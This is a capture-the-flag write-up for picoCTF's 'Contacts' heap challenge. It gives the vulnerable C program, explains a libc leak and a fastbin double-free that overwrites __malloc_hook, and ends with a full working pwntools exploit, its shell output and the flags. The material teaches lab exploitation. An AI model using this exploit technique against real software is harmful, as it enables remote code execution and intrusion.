# Contacts
Binary Exploitation, 850 points

## Description:
> This program for storing your contacts is currently in beta. Can you hijack control and get a shell?

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define MAX_CONTACTS 16

struct contact {
    char *name;
    char *bio;
};

struct contact *contacts[MAX_CONTACTS];
unsigned int num_contacts = 0;

void print_contacts(){
    for (int i = 0; i < num_contacts; i++){
        if (contacts[i]->bio != NULL){
            printf("%s - %s\n", contacts[i]->name, contacts[i]->bio);
        }else{
            printf("%s - (No bio)\n", contacts[i]->name);
        }
    }
}

struct contact *find_contact(char *name){
    for (int i = 0; i < num_contacts; i++){
        if (!strcmp(name, contacts[i]->name)){
            return contacts[i];
        }
    }
    return NULL;
}

void create_contact(char *name){
    if (num_contacts == MAX_CONTACTS){
        puts("Too many contacts! Delete one first!");
        return;
    }

    struct contact *contact = (struct contact *)malloc(sizeof(struct contact));
    if (contact == NULL){
        puts("Could not allocate new contact.");
        exit(-1);
    };

    /* make a copy of the name on the heap */
    contact->name = strdup(name);
    if (contact->name == NULL){
        puts("Could not duplicate name.");
        exit(-1);
    }

    contacts[num_contacts++] = contact;
}

void delete_contact(struct contact *contact){
    free(contact->name);

    /* if the bio is set, free it as well */
    if (contact->bio != NULL){
        free(contact->bio);
    }

    free(contact);

    /* replace the corresponding index with the last contact and decrement num_contacts */
    for (int i = 0; i < num_contacts; i++){
        if (contacts[i] == contact){
            contacts[i] = contacts[num_contacts - 1];
            num_contacts--;
            break;
        }
    }
}

void set_bio(struct contact *contact){
    char input[4];
    size_t length;

    /* we'll replace the old bio */
    if (contact->bio != NULL){
        free(contact->bio);
    }

    puts("How long will the bio be?");
    if (fgets(input, 4, stdin) == NULL){
        puts("Couldn't read length.");
        return;
    };

    length = strtoul(input, NULL, 10);
    if (length > 255){
        puts("Bio must be at most 255 characters.");
        return;
    }

    contact->bio = (char *)malloc(length+1);
    if (contact->bio == NULL){
        puts("Couldn't allocate bio.");
        exit(-1);
    }

    puts("Enter your new bio:");
    if (fgets(contact->bio, length+1, stdin) == NULL){
        puts("Couldn't read bio.");
        return;
    }

    puts("Bio recorded.");
}

void menu(){
    puts("Available commands:");
    puts("\tdisplay - display the contacts");
    puts("\tcreate [name] - create a new contact");
    puts("\tdelete [name] - delete an existing contact");
    puts("\tbio [name] - set the bio for an existing contact");
    puts("\tquit - exit the program");
}

int process_cmd(char *cmd){
    struct contact *contact;
    char *name;

    if (!strncmp(cmd, "display", 7)){
        print_contacts();

    }else if (!strncmp(cmd, "create", 6)){
        name = strtok(&cmd[7], "\n");
        if (name == NULL){
            puts("Invalid command");
            return 0;
        }

        create_contact(name);
        printf("Created contact \"%s\"\n", name);

    }else if (!strncmp(cmd, "delete", 6)){
        name = strtok(&cmd[7], "\n");
        if (name == NULL){
            puts("Invalid command");
            return 0;
        }

        contact = find_contact(name);
        if (contact == NULL){
            puts("Can't find contact");
            return 0;
        }

        delete_contact(contact);
        printf("Deleted contact \"%s\"\n", name);

    }else if (!strncmp(cmd, "bio", 3)){
        name = strtok(&cmd[4], "\n");
        if (name == NULL){
            puts("Invalid command");
            return 0;
        }

        contact = find_contact(name);
        if (contact == NULL){
            puts("Can't find contact");
            return 0;
        }

        set_bio(contact);

    }else if (!strncmp(cmd, "quit", 4)){
        return 1;
    }else{
        puts("Invalid option");
        menu();
    }
    return 0;
}

void command_loop(){
    char buf[512];

    menu();
    while(1){
        puts("\nEnter your command:");
        putchar('>'); putchar(' ');

        if(fgets(buf, 512, stdin) == NULL)
            break;

        if (process_cmd(buf)){
            return;
        }
    }
}

int main(int argc, char **argv){
    /* Don't buffer stdout. */
    setbuf(stdout, NULL);

    command_loop();
}
```

Two binary files were attached as well: The executable and libc.so.6.

## Solution:

The program provides a simple contact-management application. We will exploit the application in two stages:
1. Leak a libc address, allowing us to calculate the libc base address
2. Override a function pointer with a magic gadget, and use it to spawn a shell

But first, we have to run the program. Calling it locally provides the following output:
```console
root@kali:/media/sf_CTFs/pico/Contacts# ./contacts
Segmentation fault
```

We will need to make sure it uses the supplied libc when running locally (e.g. by placing both files in the same directory). 
Note: I also had to modify the LD file used by the program, which I took from the server's `/lib64/ld-linux-x86-64.so.2`. This can be done using [PatchELF](https://nixos.org/patchelf.html).
```console
root@kali:/media/sf_CTFs/pico/Contacts# scp user@2018shell2.picoctf.com:/lib64/ld-linux-x86-64.so.2 .
picoCTF{who_n33ds_p4ssw0rds_38dj21}
ld-linux-x86-64.so.2                   100%  159KB  90.1KB/s   00:01
root@kali:/media/sf_CTFs/pico/Contacts# cp contacts contacts_test
root@kali:/media/sf_CTFs/pico/Contacts# ldd contacts
        linux-vdso.so.1 (0x00007ffef2978000)
        libc.so.6 => ./libc.so.6 (0x00007ff4153f7000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ff4157c3000)
root@kali:/media/sf_CTFs/pico/Contacts# ./contacts_test
Segmentation fault
root@kali:/media/sf_CTFs/pico/Contacts# patchelf  --set-interpreter ./ld-linux-x86-64.so.2 ./contacts_test
root@kali:/media/sf_CTFs/pico/Contacts# ldd contacts_test
        linux-vdso.so.1 (0x00007fffb8ffe000)
        libc.so.6 => ./libc.so.6 (0x00007f125c382000)
        ./ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f125c74e000)
root@kali:/media/sf_CTFs/pico/Contacts# ./contacts_test
Available commands:
        display - display the contacts
        create [name] - create a new contact
        delete [name] - delete an existing contact
        bio [name] - set the bio for an existing contact
        quit - exit the program

Enter your command:
```

Now we can move on to locating the bugs in the implementation. The first bug is found in `create_contact`:
```c
struct contact {
    char *name;
    char *bio;
};

[...]

void create_contact(char *name){
    if (num_contacts == MAX_CONTACTS){
        puts("Too many contacts! Delete one first!");
        return;
    }

    struct contact *contact = (struct contact *)malloc(sizeof(struct contact));
    if (contact == NULL){
        puts("Could not allocate new contact.");
        exit(-1);
    };

    /* make a copy of the name on the heap */
    contact->name = strdup(name);
    if (contact->name == NULL){
        puts("Could not duplicate name.");
        exit(-1);
    }

    contacts[num_contacts++] = contact;
}
```

The function allocates a new `struct contact`, but does not initialize the `bio` pointer in any way. This means that `bio` contains garbage, or in our case - specially crafted malicious data. We will use this bug to leak an address of a libc function by taking advantage of [first-fit](https://heap-exploitation.dhavalkapil.com/attacks/first_fit.html) behavior.

1. We take note of `sizeof(contact)`, which is 16.
2. We allocate a bio string of size 16, and populate it so that the last 8 bytes (equivalent to `contact->bio`) contain the address of a libc function.
3. We free the bio. The program does not clear the memory upon free.
4. We request to allocate a new contact. Due to first-fit, `malloc(sizeof(struct contact))` will return the memory which previously was used as our bio string. 
5. Since the `bio` field of the new `contact` structure was not initialized, it contains whatever was there before. In our case, the last 8 bytes contain the address of the libc function.
6. We use the display API to print the contact, which will print the bio string, which will leak the libc function address.

In Python, this translates to:
```python
class Contact(c_struct):
    _fields_ = [('p_name', c_int64),
                ('p_bio', c_int64)]

#Create a fake bio which is crafted to look like a contact struct
bio_as_contact = Contact()
bio_as_contact.p_name = 0;
bio_as_contact.p_bio = e.got["puts"]

create_contact("Leak1")
set_bio("Leak1", bio_as_contact.to_bytes())
free_bio("Leak1")
create_contact("Leak2") # Heap manager will allocate fake bio as Leak2 contact struct
puts_address = u64(get_bio("Leak2").ljust(8, '\x00'))
log.info("Runtime address of puts(): {}".format(hex(puts_address)))
libc_base = puts_address - libc.symbols['puts']
log.info("LibC base: {}".format(hex(libc_base)))
assert (libc_base & 0xFFF == 0)
```

Now, we move on to the second part of the exploit, which attacks fastbin. We will use a [double free](https://heap-exploitation.dhavalkapil.com/attacks/double_free.html) vulnerability together with a [forged chunk](https://heap-exploitation.dhavalkapil.com/attacks/forging_chunks.html) attack. A practical explanation of the attacked can also be found [here](https://sensepost.com/blog/2017/linux-heap-exploitation-intro-series-riding-free-on-the-heap-double-free-attacks/).

A "Double free" can be performed if we have the ability to free the same chunk of memory twice. This means that it will be added to the same "[free list](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bins_chunks.html)" twice (in our case - the fastbin free list, since we will be dealing with small chunks of memory). We'll see how this can be used in a moment, but first - let's take a look at the vulnerability in `set_bio`:
```c
void set_bio(struct contact *contact){
    [...]

    /* we'll replace the old bio */
    if (contact->bio != NULL){
        free(contact->bio);
    }

    puts("How long will the bio be?");
    if (fgets(input, 4, stdin) == NULL){
        puts("Couldn't read length.");
        return;
    };

    length = strtoul(input, NULL, 10);
    if (length > 255){
        puts("Bio must be at most 255 characters.");
        return;
    }

    [...]
```

As you can see, `set_bio` starts by freeing the `bio` field without later setting the pointer to NULL, but two blocks later allows us to bail out of the function by providing a large length. This leaves the `contact` struct with a `bio` pointer that is not allocated anymore, but can be freed again by repeating the same action.

It's important to note that the heap manager has a very primitive protection against double-free: It makes sure that the allocation that is being freed now, was not the allocation that was freed before this one. So, in order to perform a double-free successfully, we must free some other allocation in between.

```python
set_bio("FBMem1", cyclic(user_alloc_size)) 
set_bio("FBMem2", cyclic(user_alloc_size))

free_bio("FBMem1")
free_bio("FBMem2") # To bypass "double free or corruption (fasttop)" check
free_bio("FBMem1")
```

Each time we free an allocation, the heap manager adds it to the head of a linked list of free allocations. There are different linked lists for different sizes of allocations. For small allocations of specific ranges, the linked lists belong to what's called the "fastbin". Here's how the fastbin for our chunk size looks like during the execution of the logic above:
```python
# Fastbin: head -> tail

free_bio("FBMem1")
# Fastbin:  head -> FBMem1 -> tail

free_bio("FBMem2") # To bypass "double free or corruption (fasttop)" check
# Fastbin:  head -> FBMem2 -> FBMem1 -> tail

free_bio("FBMem1")
# Fastbin:  head -> FBMem1 -> FBMem2 -> FBMem1 (-> FBMem2 -> FBMem1 -> ...)
```

Note that after freeing `FBMem1` for the second time, the linked list becomes corrupted since `FBMem2->next` points to `FBMem1`, and as part of the second insertion of `FBMem1` into the linked list, the heap manager set `FBMem1->next` to point to `FBMem2`, since it did not know that `FBMem1` was already part of the linked list and previously pointed to `tail`.

Why is this useful? Since now we can request an allocation and receive `FBMem1`. We can actually control its content while its still considered free (due to the fact that `FBMem2`, which is in the free list, is still pointing to it). We can modify its `next` pointer to any location in memory. Once we request two more allocations (one for `FBMem2` and one for the second `FBMem1`), the allocation after that will return whoever `FBMem->next` was pointing to, which means we can control an arbitrary chunk of memory which isn't supposed to be part of the heap.

In many cases, it is useful to use this technique to allocation a chunk of memory which contains the `__malloc_hook` pointer. 

> The GNU C Library lets you modify the behavior of malloc, realloc, and free by specifying appropriate hook functions. You can use these hooks to help you debug programs that use dynamic memory allocation, for example. 
> 
> Variable: __malloc_hook: 
> The value of this variable is a pointer to the function that malloc uses whenever it is called.

So `malloc` will call `__malloc_hook` if it is set. If we set `__malloc_hook` to a magic gadget (i.e. code residing in libc which opens a shell when being executed), we will be able to read the flag.

There is one point though. Fastbin has a sanity check that the size of the chunk being removed from the linked list and returned to the user is indeed in the appropriate range for fastbin chunks (for 64-bit, fastbin sizes are 0x20, 0x30, ... 0x80. For any allocation, 0x10 bytes are metadata hidden from the user).

This is a representation of a **free** fastbin chunk ([source](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/malloc_chunk.html)): 
```
    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `head:' |             Size of chunk, in bytes                     |A|0|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Forward pointer to next chunk in list             |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Back pointer to previous chunk in list            |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Unused space (may be 0 bytes long)                .
            .                                                               .
            .                                                               |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

It's also important to note that for an **allocated** chunk of memory, the structure is actually different:
```
    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|M|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

As you can see, the "forward" and "back" pointers of a free chunk actually sit in the same location of user data in an allocated chunk.

Now, we need to align the fake chunk so that the size of the chunk is legal, and the pointer we want to override is located within the user data. 
Usually this is done by pointing the chunk to `__malloc_hook - 0x23`.

This is how the `__malloc_hook` area looks like:
```
0x7ffff7dd1ad0: 0x0000000000000000      0x0000000000000000
0x7ffff7dd1ae0: 0x0000000000000000      0x0000000000000000
0x7ffff7dd1af0: 0x00007ffff7dd0260      0x0000000000000000
0x7ffff7dd1b00 <__memalign_hook>:       0x00007ffff7a92e20      0x00007ffff7a92a00
0x7ffff7dd1b10 <__malloc_hook>: 0x0000000000000000      0x0000000000000000
0x7ffff7dd1b20: 0x0000000100000000      0x0000000000000000
```

But if we step back 0x23 bytes, we get:
```
gdb-peda$ x /12xg (char*)&__malloc_hook-0x23
0x7ffff7dd1aed: 0xfff7dd0260000000      0x000000000000007f
0x7ffff7dd1afd: 0xfff7a92e20000000      0xfff7a92a0000007f
0x7ffff7dd1b0d <__realloc_hook+5>:      0x000000000000007f      0x0000000000000000
0x7ffff7dd1b1d: 0x0100000000000000      0x0000000000000000
0x7ffff7dd1b2d: 0x0000000000000000      0x0000000000000000
0x7ffff7dd1b3d: 0x0000000000000000      0x0000000000000000
```

If we interpret this memory as a chunk (mchunkptr), this gives us a chunk size of 0x7f which fits the fastbin criteria! We just need to make sure that the rest of our allocations belong to the same bin (the 0x70 bin). Therefore, we need to use ~0x60 byte allocations (which have the overhead of 0x10 bytes metadata - see detailed explanation [here](https://github.com/shellphish/how2heap/issues/71)).

Remember - after freeing `FBMem1` for the second time, our fast bin was as follows:
```
head -> FBMem1 -> FBMem2 -> FBMem1 (-> FBMem2 -> FBMem1 -> ...)
```

Now we perform the following sequence:
1. We allocate `FBMem3`: Heap manager removes the memory chunk previously known as `FBMem1` from the head of the linked list, and returns it to us. Fastbin is now ` head -> FBMem2 -> FBMem1 (-> FBMem2 ...)`
2. We overwrite `FBMem3` (a.k.a. `FBMem1`) with the specially crafted `__malloc_hook - 0x23` buffer. Since there is another instance of `FBMem1` in the linked list, it now looks like: `head -> FBMem2 -> FBMem1 -> fake_chunk -> ?`
3. We allocate `FBMem4`: Heap manager removes the memory chunk previously known as `FBMem2` from the head of the linked list, and returns it to us. Fastbin is now ` head -> FBMem1 -> fake_chunk -> ?`
4. We allocate `FBMem5`: Heap manager removes the memory chunk previously known as `FBMem1` and currently also known as `FBMem3` from the head of the linked list, and returns it to us. Fastbin is now ` head -> fake_chunk -> ?`
5. We allocate `FBMem6`: Heap manager removes the fake memory chunk from the linked list, and using `FBMem6` we now have access to the memory range we wanted to control.


Once we receive control of the allocated chunk which contains `__malloc_hook`, we can override the `__malloc_hook` pointer by writing to offset 0x13 from the user data pointer (which in turn is 0x10 bytes from the beginning of the memory chunk, summing up to 0x23).

We use [One Gadget](https://github.com/david942j/one_gadget) to find a magic gadget, and we're done - the next allocation we make will call the magic gadget and give us a shell.

Putting it all together:
```python
from pwn import *
from ctypes import *
import re

PROGRAM = "./contacts"
LIBC = "./libc.so.6"
MAX_BIO_LEN = 255


class c_struct(Structure):
    def to_bytes(self):
        return buffer(self)[:]

class Contact(c_struct):
    _fields_ = [('p_name', c_int64),
                ('p_bio', c_int64)]

#The "user data" part of struct malloc_chunk
class MallocChunkInternal(c_struct):
    _fields_ = [('p_fd', c_int64),
                ('p_bk', c_int64)]


def read_menu():
    p.recvuntil("Enter your command:\n> ")

def get_bio(name):
    read_menu()
    p.sendline("display")
    out = p.recvline_contains(name + " - ")
    bio = out.replace("{} - ".format(name), "")
    log.info("Display: name = '{}', bio = '{}'".format(name, enhex(bio)))
    return bio

def create_contact(name):
    read_menu()
    p.sendline("create {}".format(name))
    log.info("Created name '{}'".format(name))
    #p.recvuntil("Created contact")

def delete_contact(name):
    read_menu()
    p.sendline("delete {}".format(name))
    log.info("Deleted name '{}'".format(name))
    p.recvuntil("Deleted contact")

def set_bio(name, bio):
    read_menu()
    p.sendline("bio {}".format(name))
    bio_len = len(bio)
    p.sendlineafter("How long will the bio be?", str(bio_len))
    if bio_len > MAX_BIO_LEN:
        log.info("Bio for {} pseudo-freed".format(name))
        return
    p.sendlineafter("Enter your new bio:", bio)
    p.recvuntil("Bio recorded.")
    log.info("Bio set for name '{}': {}".format(name, enhex(bio)))

    
def quit():
    read_menu()
    p.sendline("quit")
    log.info("Quitting")

def free_bio(name):
    set_bio(name, "A" * (MAX_BIO_LEN + 1) )

e = ELF(PROGRAM)
libc = ELF(LIBC)

og_proc = process(["one_gadget", "-r", libc.path])
gadgets = og_proc.recvall()
gadget = int(gadgets.split(" ")[1]) # Gadget #0 didn't work...
log.info("One-gadget address for {}: {}".format(LIBC, hex(gadget)))


p = remote("2018shell3.picoctf.com", 29455)
#p = process(PROGRAM)

#Create a fake bio which is crafted to look like a contact struct
bio_as_contact = Contact()
bio_as_contact.p_name = 0;
bio_as_contact.p_bio = e.got["puts"]

log.info("Address of puts() .got.plt: {}".format(hex(e.got["puts"])))
log.info("Address of puts() in libc: {}".format(hex(libc.symbols['puts'])))

create_contact("Leak1")
set_bio("Leak1", bio_as_contact.to_bytes())
free_bio("Leak1")
create_contact("Leak2") # Heap manager will allocate fake bio as Leak2 contact struct
puts_address = u64(get_bio("Leak2").ljust(8, '\x00'))
log.info("Runtime address of puts(): {}".format(hex(puts_address)))
libc_base = puts_address - libc.symbols['puts']
log.info("LibC base: {}".format(hex(libc_base)))
assert (libc_base & 0xFFF == 0)

libc.address = libc_base


create_contact("FBMem1")
create_contact("FBMem2")
create_contact("FBMem3")
create_contact("FBMem4")
create_contact("FBMem5")
create_contact("FBMem6")

user_alloc_size = 0x60 #Heap manager's request2size(0x60) = 0x70, putting this allocation in the same bin as a 0x7f allocation (dictated by logic below)

set_bio("FBMem1", cyclic(user_alloc_size)) 
set_bio("FBMem2", cyclic(user_alloc_size))

free_bio("FBMem1")
# head -> FBMem1 -> tail

free_bio("FBMem2") # To bypass "double free or corruption (fasttop)" check
# head -> FBMem2 -> FBMem1 -> tail

free_bio("FBMem1")
# head -> FBMem1 -> FBMem2 -> FBMem1 (-> FBMem2 -> FBMem1 -> ...)

offset_byte_7f = libc.symbols["__malloc_hook"] - 0x23 # Align so that: (a) __malloc_hook is within the allocated chunk (b) mchunk_size is 0x7f, within fastbin range
malloc_chunk_internal = MallocChunkInternal()
malloc_chunk_internal.p_fd = offset_byte_7f
malloc_chunk_internal.p_bk = 0 #tail

set_bio("FBMem3", fit({0: malloc_chunk_internal.to_bytes()}, filler = '\0', length = user_alloc_size) ) # Will allocate FBMem1. 
# FastBin: head -> FBMem2 -> FBMem1 (-> FBMem2 ...), and then: head -> FBMem2 -> FBMem1 -> offset_byte_7f -> ?

set_bio("FBMem4", cyclic(user_alloc_size)) # Will allocate FBMem2. FastBin: head -> FBMem1 -> offset_byte_7f -> ?
set_bio("FBMem5", cyclic(user_alloc_size)) # Will allocate FBMem1. FastBin: head -> offset_byte_7f -> ?


# If we requested the heap manager to allocate a chunk at (__malloc_hook - 0x23), it will actually return to the user the memory 
# starting at (__malloc_hook - 0x23 + sizeof(mchunk_prev_size) + sizeof(mchunk_size)) = (__malloc_hook - 0x23 + 8 + 8) = (__malloc_hook - 0x13).
# Therefore, we just pad the first meaningless 0x13 bytes, and only then place the pointer we want __malloc_hook to call.
set_bio("FBMem6", fit({0x13: p64(libc_base + gadget)}, filler = '\0', length = user_alloc_size) ) # will allocate offset_byte_7f (which was FBMem1->fd)
# This will write the magic gadget address to offset_byte_7f + 0x13, which is the start address of __malloc_hook

create_contact("Shell") # Will call __malloc_hook when trying to allocate, which is now pointing to one-gadget
p.interactive()
```

The output:
```console
root@kali:/media/sf_CTFs/pico/Contacts# python exploit.py
[*] '/media/sf_CTFs/pico/Contacts/contacts_test'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RPATH:    './'
    FORTIFY:  Enabled
[*] '/media/sf_CTFs/pico/Contacts/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/usr/local/bin/one_gadget': pid 1414
[+] Receiving all data: Done (28B)
[*] Process '/usr/local/bin/one_gadget' stopped with exit code 0 (pid 1414)
[*] One-gadget address for ./libc.so.6: 0x4526a
[+] Opening connection to 2018shell3.picoctf.com on port 29455: Done
[*] Address of puts() .got.plt: 0x602020
[*] Address of puts() in libc: 0x6f690
[*] Created name 'Leak1'
[*] Bio set for name 'Leak1': 00000000000000002020600000000000
[*] Bio for Leak1 pseudo-freed
[*] Created name 'Leak2'
[*] Display: name = 'Leak2', bio = '902686f07e7f'
[*] Runtime address of puts(): 0x7f7ef0862690
[*] LibC base: 0x7f7ef07f3000
[*] Created name 'FBMem1'
[*] Created name 'FBMem2'
[*] Created name 'FBMem3'
[*] Created name 'FBMem4'
[*] Created name 'FBMem5'
[*] Created name 'FBMem6'
[*] Bio set for name 'FBMem1': 6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161736161617461616175616161766161617761616178616161
[*] Bio set for name 'FBMem2': 6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161736161617461616175616161766161617761616178616161
[*] Bio for FBMem1 pseudo-freed
[*] Bio for FBMem2 pseudo-freed
[*] Bio for FBMem1 pseudo-freed
[*] Bio set for name 'FBMem3': ed7abbf07e7f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
[*] Bio set for name 'FBMem4': 6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161736161617461616175616161766161617761616178616161
[*] Bio set for name 'FBMem5': 6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161736161617461616175616161766161617761616178616161
[*] Bio set for name 'FBMem6': 000000000000000000000000000000000000006a8283f07e7f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
[*] Created name 'Shell'
[*] Switching to interactive mode
Invalid option
Available commands:
    display - display the contacts
    create [name] - create a new contact
    delete [name] - delete an existing contact
    bio [name] - set the bio for an existing contact
    quit - exit the program

Enter your command:
> $ cat flag.txt
picoCTF{4_5pr3e_0f_d0ubl3_fR33_5b6d2d6c}
$
```

The flag: picoCTF{4_5pr3e_0f_d0ubl3_fR33_5b6d2d6c}